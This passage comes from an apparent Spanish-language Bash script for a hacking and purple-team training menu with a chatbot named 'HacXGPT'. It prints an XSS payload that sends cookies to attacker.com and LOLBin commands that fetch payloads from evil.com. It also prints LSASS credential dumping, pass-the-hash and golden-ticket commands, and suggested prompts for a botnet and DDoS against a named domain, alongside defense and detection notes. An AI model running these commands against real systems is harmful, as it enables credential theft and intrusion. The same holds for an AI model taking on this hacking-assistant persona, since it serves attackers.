        echo "🛡️ PREVENCIÓN:"
        echo "- Prepared statements"
        echo "- Input validation"
        echo "- Least privilege"
    }

    _chat_nmap() {
        echo "🔍 NMAP - ESCANEO PROFESIONAL"
        echo ""
        echo "⚙️ COMANDOS ESENCIALES:"
        echo "- nmap -sS -sV -p- [OBJETIVO]"
        echo "- nmap -sS -T2 [OBJETIVO] (sigiloso)"
        echo "- nmap -A -T4 [OBJETIVO] (agresivo)"
        echo "- nmap -sU [OBJETIVO] (UDP - lento)"
        echo ""
        echo "🎯 TÉCNICAS ESPECIALES:"
        echo "- Fragmentación: nmap -f"
        echo "- Decoys: nmap -D RND:10"
        echo "- Timing: -T0 a -T5"
    }

    _chat_xss() {
        echo "🎯 XSS (CROSS-SITE SCRIPTING)"
        echo ""
        echo "💣 PAYLOADS:"
        echo "- <script>alert(1)</script>"
        echo "- <img src=x onerror=alert(1)>"
        echo "- <script>fetch('https://attacker.com/?c='+document.cookie)</script>"
        echo ""
        echo "🛠️ HERRAMIENTAS:"
        echo "- XSSstrike"
        echo "- Burp Suite"
        echo "- OWASP ZAP"
        echo ""
        echo "🛡️ MITIGACIÓN:"
        echo "- Content Security Policy"
        echo "- Output encoding"
        echo "- HttpOnly cookies"
    }

    _chat_phishing() {
        echo "🎣 PHISHING - INGENIERÍA SOCIAL"
        echo ""
        echo "🔄 TÉCNICAS:"
        echo "- Clonación de sitios"
        echo "- Emails suplantando identidad"
        echo "- SMS phishing (smishing)"
        echo "- Vishing (phishing por voz)"
        echo ""
        echo "🔧 HERRAMIENTAS:"
        echo "- Social-Engineer Toolkit (SET)"
        echo "- Gophish"
        echo "- SimpleEmailSpoofer"
        echo ""
        echo "🛡️ PROTECCIÓN:"
        echo "- Verificar URLs"
        echo "- Autenticación multifactor"
        echo "- Educación del usuario"
    }

    _chat_hash() {
        echo "🔐 DESCIFRADO DE HASHES"
        echo ""
        echo "📚 TEORÍA:"
        echo "- Hash = función criptográfica unidireccional"
        echo "- Se crackea por fuerza bruta o diccionario"
        echo ""
        echo "🛠️ HERRAMIENTAS:"
        echo "- hashcat -m [TIPO] hash.txt wordlist.txt"
        echo "- john --format=[FORMATO] hash.txt"
        echo "- hash-identifier (para identificar tipo)"
        echo ""
        echo "🎯 EJEMPLOS:"
        echo "- MD5: hashcat -m 0 hash.txt rockyou.txt"
        echo "- SHA256: hashcat -m 1400 hash.txt -a 3 ?d?d?d?d"
        echo "- NTLM: hashcat -m 1000 ntlm_hash.txt wordlist.txt"
        echo ""
        echo "⚖️ LEGALIDAD:"
        echo "- Solo hashes propios o con autorización"
        echo "- Auditorías de seguridad autorizadas"
    }

    _chat_default() {
        echo "ℹ️ No reconozco esa pregunta específica."
        echo ""
        echo "🎯 Prueba con:"
        echo "- 'botnet sobre ztlab.com.ar'"
        echo "- 'como hacer ddos'"
        echo "- 'sql injection técnicas'"
        echo "- 'nmap comandos'"
        echo "- 'xss payloads'"
        echo "- 'hash cracking'"
    }

    # Array asociativo: palabra_clave → función_de_respuesta
    # (requiere bash >= 4.0)
    declare -A chat_dispatch
    chat_dispatch["botnet"]="_chat_botnet"
    chat_dispatch["ddos"]="_chat_ddos"
    chat_dispatch["denegacion"]="_chat_ddos"
    chat_dispatch["sql"]="_chat_sql"
    chat_dispatch["inyeccion"]="_chat_sql"
    chat_dispatch["nmap"]="_chat_nmap"
    chat_dispatch["escaneo"]="_chat_nmap"
    chat_dispatch["xss"]="_chat_xss"
    chat_dispatch["phishing"]="_chat_phishing"
    chat_dispatch["hash"]="_chat_hash"
    chat_dispatch["descifrar"]="_chat_hash"
    chat_dispatch["contraseña"]="_chat_hash"
    # === NUEVOS keywords MITRE / experto ===
    chat_dispatch["cve"]="_chat_cve"
    chat_dispatch["kerberoasting"]="_chat_kerberoasting"
    chat_dispatch["kerb"]="_chat_kerberoasting"
    chat_dispatch["lolbin"]="_chat_lolbins"
    chat_dispatch["lolbins"]="_chat_lolbins"
    chat_dispatch["pass the hash"]="_chat_pth"
    chat_dispatch["pth"]="_chat_pth"
    chat_dispatch["apt29"]="_chat_apt29"
    chat_dispatch["cozy bear"]="_chat_apt29"
    chat_dispatch["apt38"]="_chat_apt38"
    chat_dispatch["lazarus"]="_chat_apt38"
    chat_dispatch["fin7"]="_chat_fin7"
    chat_dispatch["carbanak"]="_chat_fin7"
    chat_dispatch["sabias que"]="_chat_trivia"
    chat_dispatch["sabias"]="_chat_trivia"
    chat_dispatch["t1003"]="_chat_mitre_t1003"
    chat_dispatch["t1566"]="_chat_mitre_t1566"
    chat_dispatch["t1059"]="_chat_mitre_t1059"
    chat_dispatch["t1055"]="_chat_mitre_t1055"

    # Funciones de respuesta para nuevos temas
    _chat_cve() {
        echo "🔍 TOP CVEs CRÍTICOS 2024-2025"
        echo ""
        for cve_id in "${!CVE_DATA[@]}"; do
            echo -e "  ${YELLOW}$cve_id${NC}: ${CVE_DATA[$cve_id]}"
        done
        echo ""
        echo "📌 Referencia: https://nvd.nist.gov/vuln/search"
        echo "📌 Exploits:   https://www.exploit-db.com"
    }

    _chat_kerberoasting() {
        echo "🎫 KERBEROASTING — T1558.003"
        echo ""
        echo "📚 CONCEPTO:"
        echo "  Cualquier usuario autenticado en AD puede solicitar tickets TGS"
        echo "  para cuentas de servicio con SPN. El TGS está cifrado con la"
        echo "  contraseña de la cuenta de servicio → crackebale offline."
        echo ""
        echo "🔴 ATAQUE:"
        echo "  # Enum SPNs y solicitar tickets"
        echo "  GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request"
        echo "  Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt"
        echo ""
        echo "  # Crackear con hashcat (-m 13100 = krb5tgs)"
        echo "  hashcat -m 13100 -a 0 hashes.txt rockyou.txt"
        echo ""
        echo "🔵 DEFENSA:"
        echo "  • Usar AES-256 (Etype 18) en lugar de RC4 (Etype 17)"
        echo "  • Managed Service Accounts (gMSA): contraseñas automáticas"
        echo "  • Contraseñas >25 caracteres en cuentas de servicio"
        echo ""
        echo "🟣 DETECCIÓN:"
        echo "  • Event 4769: muchos TGS Etype 0x17 en poco tiempo"
        echo "  • MITRE: https://attack.mitre.org/techniques/T1558/003/"
    }

    _chat_lolbins() {
        echo "🏠 LOLBINS — Living Off The Land Binaries (T1218)"
        echo ""
        echo "📚 CONCEPTO: usar herramientas legítimas del OS para atacar"
        echo "  → El AV/EDR no detecta binarios firmados por Microsoft"
        echo ""
        echo "🔴 LOLBINS POPULARES:"
        echo "  certutil   → descargar: certutil -urlcache -f http://evil.com/x.exe x.exe"
        echo "  mshta      → HTA remoto: mshta http://evil.com/payload.hta"
        echo "  regsvr32   → sct remoto: regsvr32 /s /u /i:http://evil.com/x.sct scrobj.dll"
        echo "  msiexec    → MSI remoto: msiexec /q /i http://evil.com/x.msi"
        echo "  wscript    → VBS/JS:     wscript payload.vbs"
        echo "  rundll32   → DLL:        rundll32 evil.dll,EntryPoint"
        echo "  odbcconf    → regsvr emulado"
        echo "  bitsadmin  → descarga en background"
        echo ""
        echo "🔵 DEFENSA: WDAC / AppLocker → whitelist de execution"
        echo "🟣 DETECCIÓN: Sysmon ID 1, correlacionar args de red en binarios 'legítimos'"
        echo ""
        echo "📌 LOLBAS Project: https://lolbas-project.github.io"
    }

    _chat_pth() {
        echo "🔑 PASS THE HASH — T1550.002"
        echo ""
        echo "📚 CONCEPTO:"
        echo "  NTLM no necesita la contraseña en texto claro, sólo el hash NTLM."
        echo "  Si obtienes el hash, puedes autenticarte directamente."
        echo ""
        echo "🔴 ATAQUE:"
        echo "  # Con impacket"
        echo "  psexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH"
        echo "  wmiexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH"
        echo "  smbexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH"
        echo ""
        echo "  # Con crackmapexec (spraying)"
        echo "  crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH"
        echo ""
        echo "  # Con mimikatz (Windows)"
        echo "  sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe"
        echo ""
        echo "🔵 DEFENSA:"
        echo "  • Credential Guard (elimina hashes de memoria LSASS)"
        echo "  • Kerberos en lugar de NTLM donde sea posible"
        echo "  • Disable NTLMv1: solo permitir NTLMv2"
        echo ""
        echo "🟣 DETECCIÓN:"
        echo "  • Event 4624 Logon Type 3 con misma cuenta desde IPs distintas"
        echo "  • NTLM auth masiva → posible spraying de hashes"
    }

    _chat_apt29() {
        echo "🕵️ COZY BEAR — APT29 (SVR Rusia)"
        echo ""
        echo "  Motivación:  Espionaje gubernamental y geopolítico"
        echo "  Objetivos:   Gobierno, think tanks, salud, tecnología"
        echo "  Campañas:    SolarWinds (2020), COVID vaccines (2021), NGO targeting"
        echo ""
        echo "📋 TÉCNICAS CLAVE MITRE:"
        IFS='|' read -ra ts <<< "${APT_TECNICAS[APT29]}"
        for t in "${ts[@]}"; do
            printf "  ${YELLOW}%-16s${NC}%s\n" "${t%%:*}" "${t##*:}"
        done
        echo ""
        echo "  Herramientas únicas: SUNBURST, SUNSPOT, WellMess, BEACON"
        echo "  Referencia: https://attack.mitre.org/groups/G0016/"
    }

    _chat_apt38() {
        echo "🕵️ LAZARUS GROUP — APT38 (RGB Corea del Norte)"
        echo ""
        echo "  Motivación:  Financiera + sabotaje"
        echo "  Objetivos:   Bancos SWIFT, exchanges cripto, defensa"
        echo "  Campañas:    Bangladesh Bank \$81M (2016), Sony Pictures, WannaCry"
        echo ""
        echo "📋 TÉCNICAS CLAVE MITRE:"
        IFS='|' read -ra ts <<< "${APT_TECNICAS[APT38]}"
        for t in "${ts[@]}"; do
            printf "  ${YELLOW}%-16s${NC}%s\n" "${t%%:*}" "${t##*:}"
        done
        echo ""
        echo "  Herramientas: BLIND CANARY, HOPLIGHT, DESTOVER wiper"
        echo "  Referencia: https://attack.mitre.org/groups/G0082/"
    }

    _chat_fin7() {
        echo "🕵️ FIN7 — CARBANAK GROUP"
        echo ""
        echo "  Motivación:  Financiera — robo de tarjetas, fraude, ransomware"
        echo "  Objetivos:   Retail, hospitalidad, restaurantes, finanzas"
        echo "  Campañas:    Carbanak bancario \$1B+, ALPHV ransomware"
        echo ""
        echo "📋 TÉCNICAS CLAVE MITRE:"
        IFS='|' read -ra ts <<< "${APT_TECNICAS[FIN7]}"
        for t in "${ts[@]}"; do
            printf "  ${YELLOW}%-16s${NC}%s\n" "${t%%:*}" "${t##*:}"
        done
        echo ""
        echo "  Herramientas: BABYMETAL, BIRDWATCH, CARBANAK, DICELOADER"
        echo "  Referencia: https://attack.mitre.org/groups/G0046/"
    }

    _chat_trivia() {
        local idx=$(( RANDOM % ${#SABIAS_QUE[@]} ))
        echo "💡 ¿SABÍAS QUE...?"
        echo ""
        echo "  ${SABIAS_QUE[$idx]}"
        echo ""
        echo "  Escribe 'cve', 'kerberoasting', 'lolbins', 'apt29'... para más!"
    }

    _chat_mitre_t1003() {
        _show_purple_technique "T1003"
    }
    _chat_mitre_t1566() {
        _show_purple_technique "T1566"
    }
    _chat_mitre_t1059() {
        _show_purple_technique "T1059"
    }
    _chat_mitre_t1055() {
        _show_purple_technique "T1055"
    }

    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}💬 CHAT LIBRE TÉCNICO${CYAN}              ║${NC}"
        echo -e "${CYAN}║   ${YELLOW}Hacking · MITRE ATT&CK · CVEs · APTs${CYAN}    ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""

        echo -e "${GREEN}📚 TEMAS DISPONIBLES:${NC}"
        echo -e "${BLUE}• botnet, ddos, sql, xss, phishing, hash${NC}"
        echo -e "${PURPLE}• cve${NC}          - Top CVEs 2024-2025 con CVSS"
        echo -e "${PURPLE}• kerberoasting${NC} - T1558.003 detallado"
        echo -e "${PURPLE}• lolbins${NC}       - Living Off The Land Binaries"
        echo -e "${PURPLE}• pass the hash${NC} - T1550.002 con comandos"
        echo -e "${RED}• apt29, apt38, fin7${NC} - Perfiles de APT"
        echo -e "${YELLOW}• sabias que${NC}    - Dato de inteligencia de amenazas"
        echo -e "${CYAN}• t1003, t1566, t1059, t1055${NC} - Purple Team por ID"
        echo ""
        echo -e "${RED}📝 Escribe 'salir' para volver al menú${NC}"
        echo ""

        read -p "❓ Tu pregunta: " pregunta

        pregunta_lower=$(echo "$pregunta" | tr '[:upper:]' '[:lower:]')

        if [[ "$pregunta_lower" == "salir" ]]; then
            echo ""
            echo "Regresando al menú principal..."
            sleep 1
            return
        fi

        echo ""
        echo "🤖 HacXGPT:"
        echo "══════════════════════════════════════════════"

        # Buscar coincidencia en el array asociativo
        matched_fn=""
        for keyword in "${!chat_dispatch[@]}"; do
            if [[ "$pregunta_lower" == *"$keyword"* ]]; then
                matched_fn="${chat_dispatch[$keyword]}"
                break
            fi
        done

        if [[ -n "$matched_fn" ]]; then
            output=$("$matched_fn")
            echo "$output"
            save_output "[$pregunta] $output"
        else
            _chat_default
        fi

        echo "══════════════════════════════════════════════"
        echo ""
        read -p "💬 Otra pregunta? (Enter para salir): " continuar
        if [[ -z "$continuar" ]]; then
            return
        fi
    done
}

# ============================================
# 8. ESCANEO SIGILOSO (IMPLEMENTADO)
# ============================================
escaneo_sigiloso() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}🔍 ESCANEO SIGILOSO${CYAN}                ║${NC}"
        echo -e "${CYAN}║      ${YELLOW}Técnicas avanzadas de escaneo${CYAN}        ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🎯 TÉCNICAS DE ESCANEO SIGILOSO:${NC}"
        echo ""
        echo "1. Escaneo TCP SYN (Stealth)"
        echo "2. Escaneo XMAS Tree"
        echo "3. Escaneo FIN"
        echo "4. Escaneo NULL"
        echo "5. Escaneo UDP"
        echo "6. Técnicas de evasión"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🎯 Objetivo para SYN Stealth: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 ESCANEO TCP SYN STEALTH:${NC}"
                    echo ""
                    echo "• Comando básico: nmap -sS $objetivo"
                    echo "• Con timing lento: nmap -sS -T2 $objetivo"
                    echo "• Puertos específicos: nmap -sS -p 80,443,22 $objetivo"
                    echo "• Sin ping: nmap -sS -Pn $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes SYN y analiza respuestas SYN-ACK"
                    echo "No completa el handshake TCP (más sigiloso)"
                fi
                ;;
            2)
                read -p "🎯 Objetivo para XMAS Tree: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🎄 ESCANEO XMAS TREE:${NC}"
                    echo ""
                    echo "• Comando: nmap -sX $objetivo"
                    echo "• Con opciones: nmap -sX -T2 $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes con flags FIN, URG y PUSH activados"
                    echo "Como un árbol de Navidad (XMAS)"
                fi
                ;;
            3)
                read -p "🎯 Objetivo para FIN Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🏁 ESCANEO FIN:${NC}"
                    echo ""
                    echo "• Comando: nmap -sF $objetivo"
                    echo "• Variante: nmap -sF -f $objetivo (fragmentado)"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes solo con flag FIN activado"
                    echo "Útil para evadir firewalls simples"
                fi
                ;;
            4)
                read -p "🎯 Objetivo para NULL Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🚫 ESCANEO NULL:${NC}"
                    echo ""
                    echo "• Comando: nmap -sN $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes sin ningún flag activado"
                    echo "Completamente 'null'"
                fi
                ;;
            5)
                read -p "🎯 Objetivo para UDP Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}📨 ESCANEO UDP:${NC}"
                    echo ""
                    echo "• Comando: nmap -sU $objetivo"
                    echo "• Puertos comunes: nmap -sU -F $objetivo"
                    echo "• Todos los puertos: nmap -sU -p- $objetivo (MUY LENTO)"
                    echo ""
                    echo "⚠️ ADVERTENCIA:"
                    echo "Los escaneos UDP son muy lentos"
                    echo "Puede tomar horas para todos los puertos"
                fi
                ;;
            6)
                echo ""
                echo -e "${YELLOW}🎭 TÉCNICAS DE EVASIÓN:${NC}"
                echo ""
                echo "• Fragmentación: nmap -f"
                echo "• MTU personalizado: nmap --mtu 16"
                echo "• Decoys: nmap -D RND:10"
                echo "• Spoofing: nmap -S [IP_FALSA]"
                echo "• Source port: nmap --source-port 53"
                echo "• Timing aleatorio: nmap --scan-delay 5s"
                echo "• Data length: nmap --data-length 50"
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================================
# 9. MATRIZ MITRE ATT&CK — NAVEGADOR COMPLETO
# ============================================================
mitre_menu() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║        ${GREEN}🎯 MATRIZ MITRE ATT&CK v14${CYAN}              ║${NC}"
        echo -e "${CYAN}║      ${YELLOW}Enterprise Matrix — 14 Tácticas${CYAN}           ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}TÁCTICAS ENTERPRISE:${NC}"
        echo ""
        local idx=1
        for tid in "${MITRE_ORDEN[@]}"; do
            printf "  ${YELLOW}%2d.${NC} ${CYAN}[%s]${NC} %s\n" "$idx" "$tid" "${MITRE_TACTICAS[$tid]}"
            ((idx++))
        done
        echo -e "  ${RED} 0. Volver al menú principal${NC}"
        echo ""
        read -p "🎯 Selecciona táctica [0-14]: " sel
        [[ "$sel" == "0" ]] && return
        if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= 14 )); then
            local tactica_id="${MITRE_ORDEN[$((sel-1))]}"
            local tactica_nombre="${MITRE_TACTICAS[$tactica_id]}"
            # Mostrar técnicas de esa táctica
            while true; do
                show_banner
                echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
                echo -e "${PURPLE}║  ${CYAN}[$tactica_id]${NC} ${GREEN}${tactica_nombre}${NC}"
                echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
                echo ""
                echo -e "${YELLOW}TÉCNICAS CLAVE:${NC}"
                echo ""
                local tecnicas_str="${MITRE_TECNICAS[$tactica_id]}"
                IFS='|' read -ra tecnicas <<< "$tecnicas_str"
                local tidx=1
                for tec in "${tecnicas[@]}"; do
                    local tid_t="${tec%%:*}"
                    local tname="${tec##*:}"
                    printf "  ${YELLOW}%d.${NC} ${CYAN}%-12s${NC} %s\n" "$tidx" "$tid_t" "$tname"
                    ((tidx++))
                done
                echo ""
                echo -e "  ${BLUE}L. Ver en modo Purple Team (Ataque+Defensa)${NC}"
                echo -e "  ${RED}0. Volver${NC}"
                echo ""
                read -p "🔍 Selecciona técnica o [L/0]: " tsel
                [[ "$tsel" == "0" ]] && break
                if [[ "${tsel,,}" == "l" ]]; then
                    # Mostrar purple team de la primera técnica
                    local first_id="${tecnicas[0]%%:*}"
                    _show_purple_technique "$first_id"
                elif [[ "$tsel" =~ ^[0-9]+$ ]] && (( tsel >= 1 && tsel < tidx )); then
                    local sel_tec="${tecnicas[$((tsel-1))]}"
                    local sel_id="${sel_tec%%:*}"
                    _show_purple_technique "$sel_id"
                fi
                echo ""
                read -p "↵ Presiona Enter para continuar..." _
            done
        fi
    done
}

# Helper: muestra vista Purple Team de una técnica por ID
_show_purple_technique() {
    local tech_id="${1^^}"
    local pdata="${PURPLE_DATA[$tech_id]}"
    echo ""
    if [[ -z "$pdata" ]]; then
        echo -e "${YELLOW}ℹ️  No hay datos Purple Team detallados para $tech_id.${NC}"
        echo -e "    Consulta: ${CYAN}https://attack.mitre.org/techniques/$tech_id${NC}"
        return
    fi
    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║  PURPLE TEAM — ${CYAN}$tech_id${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
    # Separar secciones por |||
    IFS='|||' read -ra partes <<< "$pdata"
    for parte in "${partes[@]}"; do
        [[ -z "${parte// }" ]] && continue
        echo -e "$parte"
    done
    save_output "[$tech_id PURPLE]\n$pdata"
}

# ============================================================
# 10. MODO PURPLE TEAM
# ============================================================
modo_purple_team() {
    while true; do
        show_banner
        echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║          ${RED}🔴 RED${NC} ${CYAN}+${NC} ${BLUE}🔵 BLUE${NC} ${CYAN}+${NC} ${PURPLE}🟣 PURPLE TEAM       ${PURPLE}║${NC}"
        echo -e "${PURPLE}║     ${YELLOW}Técnica por técnica: Ataque & Defensa${NC}     ${PURPLE}║${NC}"
        echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}TÉCNICAS PURPLE TEAM DISPONIBLES:${NC}"
        echo ""
        local teclist=(T1003 T1027 T1055 T1059 T1078 T1021 T1053 T1190 T1566 T1562)
        local tidx=1
        for t in "${teclist[@]}"; do
            # Obtener nombre de la primera línea del PURPLE_DATA
            local linea
            linea=$(echo "${PURPLE_DATA[$t]}" | grep -m1 "ATAQUE" | sed 's/🔴 ATAQUE — //' | sed 's/://')
            printf "  ${YELLOW}%2d.${NC} ${CYAN}%-8s${NC} %s\n" "$tidx" "$t" "$linea"
            ((tidx++))
        done
        echo ""
        echo -e "  ${BLUE}M. Buscar por ID de técnica (ej: T1003)${NC}"
        echo -e "  ${RED}0. Volver${NC}"
        echo ""
        read -p "🟣 Selecciona [1-${#teclist[@]}, M, 0]: " sel

        case "${sel,,}" in
            0) return ;;
            m)
                read -p "   Ingresa ID de técnica (ej: T1003): " tid_input
                _show_purple_technique "${tid_input^^}"
                read -p "↵ Enter para continuar..." _
                ;;
            *)
                if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#teclist[@]} )); then
                    _show_purple_technique "${teclist[$((sel-1))]}"
                    read -p "↵ Enter para continuar..." _
                fi
                ;;
        esac
    done
}

# ============================================================
# 11. POST-EXPLOTACIÓN (Windows + Linux + Evasión)
# ============================================================
post_explotacion_windows() {
    while true; do
        show_banner
        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║       ${YELLOW}💣 POST-EXPLOTACIÓN — WINDOWS${NC}            ${RED}║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "1. T1003 — OS Credential Dumping (Mimikatz/secretsdump)"
        echo "2. T1555 — Credentials from Password Stores (DPAPI/browsers)"
        echo "3. T1558.003 — Kerberoasting (Rubeus/impacket)"
        echo "4. T1550.003 — Pass-the-Ticket (PtT)"
        echo "5. T1082 — System Information Discovery"
        echo "6. T1018 — Remote System Discovery (BloodHound)"
        echo "7. Volver"
        echo ""
        read -p "💣 Selecciona [1-7]: " op
        case $op in
            1)
                echo -e "${RED}╔══ T1003 — OS Credential Dumping ════════╗${NC}"
                echo -e "${RED}🔴 ATAQUE:${NC}"
                echo "  • mimikatz.exe privilege::debug sekurlsa::logonpasswords"
                echo "  • procdump.exe -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp"
                echo "  • python3 secretsdump.py DOMAIN/user:pass@TARGET"
                echo "  • reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM sys.hive"
                echo "  • comsvcs.dll: rundll32.exe comsvcs.dll MiniDump \$(PID) lsass.dmp full"
                echo ""
                echo -e "${BLUE}🔵 DEFENSA:${NC}"
                echo "  • Activar Windows Defender Credential Guard"
                echo "  • Protected Users Security Group en Active Directory"
                echo "  • Deshabilitar WDigest: UseLogonCredential = 0"
                echo "  • gMSA/MSA en lugar de cuentas de servicio normales"
                echo ""
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
                echo "  • Event ID 4656/4663: acceso a handle de LSASS"
                echo "  • Sysmon Event ID 10: ProcessAccess → lsass.exe"
                echo "  • Alertar si procdump/comsvcs acceden a LSASS"
                save_output "[T1003 Windows] Credential Dumping mostrado"
                ;;
            2)
                echo -e "${RED}╔══ T1555 — Credentials from Password Stores ╗${NC}"
                echo -e "${RED}🔴 ATAQUE:${NC}"
                echo "  • SharpDPAPI.exe credentials /password:Passw0rd"
                echo "  • python3 dpapi.py masterkey /in:key /password:pass"
                echo "  • Get-ChildItem 'HKCU:\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2'"
                echo "  • Dump Chrome: copy 'AppData\\Local\\Google\\Chrome\\Default\\Login Data' /tmp/"
                echo "  • LaZagne.exe all → extrae credenciales de 30+ aplicaciones"
                echo ""
                echo -e "${BLUE}🔵 DEFENSA:${NC}"
                echo "  • Gestores de contraseñas corporativos (CyberArk, BeyondTrust)"
                echo "  • Monitorear acceso a archivos de credenciales del browser"
                echo "  • Browser Enterprise Policies: bloquear exportación de contraseñas"
                echo ""
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
                echo "  • FileSystemAudit: acceso a Login Data / Cookies de Chrome/Firefox"
                echo "  • Alertar en: dpapi, LaZagne, SharpDPAPI en EDR"
                ;;
            3)
                echo -e "${RED}╔══ T1558.003 — Kerberoasting ════════════╗${NC}"
                echo -e "${RED}🔴 ATAQUE:${NC}"
                echo "  1. Enumerar SPNs:"
                echo "     GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP"
                echo "     setspn -T DOMAIN -Q */*"
                echo ""
                echo "  2. Solicitar TGS tickets:"
                echo "     Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt"
                echo "     GetUserSPNs.py DOMAIN/user:pass -request"
                echo ""
                echo "  3. Crackear offline:"
                echo "     hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
                echo "     john --format=krb5tgs --wordlist=rockyou.txt hashes.txt"
                echo ""
                echo -e "${BLUE}🔵 DEFENSA:${NC}"
                echo "  • Usar AES-256 en lugar de RC4 para cuentas de servicio (MSA/gMSA)"
                echo "  • Contraseñas >25 chars en cuentas de servicio → 100 años crackear"
                echo "  • Auditar cuentas con SPN: deben ser mínimas y monitoreadas"
                echo ""
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
                echo "  • Event ID 4769 (A): solicitud de TGS → muchas en poco tiempo = alerta"
                echo "  • Filtrar: Ticket Encryption Type = 0x17 (RC4-HMAC → vulnerable)"
                echo "  • SIEM: correlacionar 4769 masivo desde misma cuenta/IP"
                save_output "[T1558.003] Kerberoasting mostrado"
                ;;
            4)
                echo -e "${RED}╔══ T1550.003 — Pass-the-Ticket (PtT) ═══╗${NC}"
                echo -e "${RED}🔴 ATAQUE:${NC}"
                echo "  • Robar ticket: Rubeus.exe dump /service:krbtgt"
                echo "  • Importar ticket: Rubeus.exe ptt /ticket:ticket.kirbi"
                echo "  • Golden Ticket: mimikatz kerberos::golden /user:admin /domain:DOM /sid:S-1-5 /krbtgt:HASH /ptt"
                echo "  • Silver Ticket: mimikatz kerberos::golden /user:admin /target:server /service:cifs /rc4:HASH /ptt"
                echo "  • Acceder recursos: dir \\\\target\\C$"
                echo ""
                echo -e "${BLUE}🔵 DEFENSA:${NC}"
                echo "  • Cambiar contraseña de KRBTGT 2 veces (invalida todos los Golden Tickets)"
                echo "  • Privileged Access Workstations (PAW) — aísla credenciales admin"
                echo "  • Monitorear cuentas con atributos anómalos (SID history, etc.)"
                echo ""
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
                echo "  • Event ID 4768: TGT request con atributos anómalos"
                echo "  • Event ID 4769: TGS con cifrado 0x17 + cuenta sin SPN"
                echo "  • Ticket con lifetime >10h o sin pasar por DC → Golden Ticket"
                ;;
            5)
                echo -e "${RED}╔══ T1082 — System Information Discovery ═╗${NC}"
                echo -e "${RED}🔴 ATAQUE:${NC}"
                echo "  • systeminfo && whoami /all && net user && net localgroup administrators"
                echo "  • Get-ComputerInfo | Select *OS*, *Domain*"
                echo "  • wmic computersystem get model, manufacturer, systemtype"
                echo "  • tasklist /V && netstat -ano && ipconfig /all"
                echo ""
                echo -e "${BLUE}🔵 DEFENSA:${NC}"
                echo "  • JEA: limitar qué comandos puede ejecutar cada rol"
                echo "  • Detectar reconocimiento excesivo en endpoint"
                echo ""
                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
                echo "  • Sysmon ID 1: ejecución de systeminfo, whoami, net en cadena rápida"
                echo "  • Correlacionar: 5+ comandos de discovery en <2 minutos → alerta"
                ;;
            6)
                echo -e "${RED}╔══ T1018 — Remote System Discovery (BloodHound) ╗${NC}"
                echo -e "${RED}🔴 ATAQUE:${NC}"
                echo "  • SharpHound.exe --CollectionMethods All --ZipFileName output.zip"
                echo "  • bloodhound-python -u user -p pass -d DOMAIN.LOCAL -ns DC_IP -c all"
                echo "  • PowerView: Get-DomainComputer -Properties *"
                echo "  • net view /domain → listar máquinas en dominio"
                echo ""
                echo -e "${BLUE}🔵 DEFENSA:${NC}"
                echo "  • Tier model: separar cuentas admin Tier 0/1/2"
                echo "  • Monitorear cuentas que hacen bulk LDAP queries"
